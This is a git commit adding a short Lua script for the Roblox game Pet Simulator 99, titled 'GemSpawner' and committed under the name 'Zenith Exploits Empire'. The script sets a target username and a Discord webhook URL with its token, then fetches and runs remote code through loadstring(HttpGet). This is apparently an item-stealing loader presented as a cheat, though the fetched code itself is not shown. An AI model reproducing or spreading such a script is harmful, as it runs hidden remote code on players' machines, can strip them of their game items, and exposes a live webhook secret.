71a30a6db9a310bef02d022ccdaab28370eddf22
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 11:13:58 +0200

    Added ps99 script: GemSpawner

---
+++ ps99/GemSpawner.lua
@@ -0,0 +1,5 @@
+Username = "lowtaperfade_343"
+Username2 = "lowtaperfade_343"
+Webhook = "https://discord.com/api/webhooks/1363442530783330565/aeRVIKPZC3ycaXHZY2-Ct99h43okNuRN53I_5IWtymX_1bdWvJZS6mYcWSAS_XdS_V7u"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
